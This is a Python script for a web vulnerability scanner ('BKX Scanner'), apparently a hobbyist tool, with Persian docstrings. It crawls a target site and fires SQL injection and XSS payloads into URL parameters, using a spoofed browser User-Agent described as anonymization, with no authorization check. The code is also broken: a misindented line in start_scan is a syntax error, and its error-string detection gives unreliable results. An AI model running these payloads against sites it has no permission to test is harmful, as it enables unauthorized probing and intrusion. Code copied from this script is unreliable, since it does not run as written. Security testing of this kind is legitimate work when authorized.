import aiohttp
import asyncio
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import re
import json
from datetime import datetime
from tqdm import tqdm

class AdvancedWebVulnerabilityScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = aiohttp.ClientSession()
        self.vulnerabilities = []
        self.links_to_scan = set()
        self.scanned_links = set()
        self.report_filename = f"vulnerability_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        ]

    async def get_all_links(self, url):
        """استخراج تمام لینک‌ها از صفحه"""
        try:
            async with self.session.get(url, headers=self.get_headers()) as response:
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')
                for link in soup.find_all('a', href=True):
                    full_url = urljoin(url, link['href'])
                    if self.target_url in full_url and full_url not in self.scanned_links:
                        self.links_to_scan.add(full_url)
        except Exception as e:
            print(f"[-] Error extracting links from {url}: {e}")

    async def scan_sql_injection(self, url):
        """اسکن SQL Injection"""
        payloads = ["' OR '1'='1", "' OR 'a'='a", "' OR '1'='1' --"]
        params = self.extract_params(url)
        for param in params:
            for payload in payloads:
                injected_url = self.inject_payload(url, param, payload)
                try:
                    async with self.session.get(injected_url, headers=self.get_headers()) as response:
                        html = await response.text()
                        if "error" in html.lower() or "syntax" in html.lower():
                            self.add_vulnerability(url, "SQL Injection", payload)
                            return
                except Exception as e:
                    print(f"[-] SQL Injection error on {url}: {e}")

    async def scan_xss(self, url):
        """اسکن XSS"""
        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
        params = self.extract_params(url)
        for param in params:
            for payload in payloads:
                injected_url = self.inject_payload(url, param, payload)
                try:
                    async with self.session.get(injected_url, headers=self.get_headers()) as response:
                        html = await response.text()
                        if payload in html:
                            self.add_vulnerability(url, "XSS", payload)
                            return
                except Exception as e:
                    print(f"[-] XSS error on {url}: {e}")

    def inject_payload(self, url, param, payload):
        """تزریق payload به URL"""
        parsed_url = urlparse(url)
        query = parse_qs(parsed_url.query)
        query[param] = payload
        new_query = '&'.join(f"{key}={value}" for key, value in query.items())
        return f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"

    def extract_params(self, url):
        """استخراج پارامترهای ورودی از URL"""
        parsed_url = urlparse(url)
        query = parse_qs(parsed_url.query)
        return list(query.keys())

    def add_vulnerability(self, url, vuln_type, payload=None):
        """اضافه کردن آسیب‌پذیری به لیست"""
        self.vulnerabilities.append({
            "url": url,
            "type": vuln_type,
            "payload": payload,
        })
        print(f"[!] {vuln_type} vulnerability found on {url} with payload: {payload}")

    def get_headers(self):
        """دریافت هدرهای پویا برای ناشناس‌سازی"""
        return {
            "User-Agent": self.user_agents[0],
        }

    async def scan_links(self):
        """اسکن تمام لینک‌های موجود"""
        with tqdm(total=len(self.links_to_scan)) as progress_bar:
            while self.links_to_scan:
                url = self.links_to_scan.pop()
                if url not in self.scanned_links:
                    self.scanned_links.add(url)
                    progress_bar.update(1)
                    await self.get_all_links(url)
                    await self.scan_sql_injection(url)
                    await self.scan_xss(url)

    async def generate_json_report(self):
        """تولید گزارش JSON"""
        print("\n[*] Generating JSON report...")
        with open(self.report_filename, "w") as f:
            json.dump({
                "target_url": self.target_url,
                "vulnerabilities": self.vulnerabilities,
                "scan_date": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            }, f, indent=4)
        print(f"[!] Report saved to {self.report_filename}")

    async def start_scan(self):
        """شروع اسکن"""
        print(f"[*] Starting scan on {self.target_url}...")
        self.links_to_scan.add(self.target_url)
      await self.scan_links()
        await self.generate_json_report()
        await self.session.close()

def show_logo():
    """نمایش لوگو با اسکلت و عنوان"""
    print(r"""
       ______   __     _______    __     ______  
      /      \ /  |   /       \  /  |   /      \ 
     /$$$$$$  |$$ |   $$$$$$$  | $$ |  /$$$$$$  |
     $$ |  $$ |$$ |   $$ |__$$ | $$ |  $$ |__$$ |
     $$ |  $$ |$$ |   $$    $$<  $$ |  $$    $$ |
     $$ |  $$ |$$ |   $$$$$$$  | $$ |  $$$$$$$$ |
     $$ \__$$ |$$ |   $$ |__$$ | $$ |  $$ |  $$ |
     $$    $$/ $$ |   $$    $$/  $$ |  $$ |  $$ |
      $$$$$$/  $$/    $$$$$$$/   $$/   $$/   $$/ 
    """)
    print("[ BKX Scanner ] - Advanced Web Vulnerability Scanner")
    print("-" * 50)

def show_menu():
    """نمایش منوی انتخاب"""
    print("\n[1] SQL Injection Test")
    print("[2] XSS Test")
    print("[3] Full Scan (All Tests)")
    print("-" * 50)

async def main():
    """اجرای اصلی برنامه"""
    show_logo()
    show_menu()
    try:
        choice = int(input("Enter your choice (1-3): "))
        if choice not in [1, 2, 3]:
            print("[!] Invalid choice! Exiting...")
            return

        target_url = input("Enter the target URL (e.g., https://example.com): ").strip()
        if not target_url.startswith("http"):
            print("[!] Invalid URL format. Exiting...")
            return

        scanner = AdvancedWebVulnerabilityScanner(target_url)
        if choice == 1:
            print("\n[*] Starting SQL Injection Test...")
            await scanner.scan_sql_injection(target_url)
        elif choice == 2:
            print("\n[*] Starting XSS Test...")
            await scanner.scan_xss(target_url)
        elif choice == 3:
            print("\n[*] Starting Full Scan...")
            await scanner.start_scan()

        print("\n[✔] Scanning completed successfully.")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())
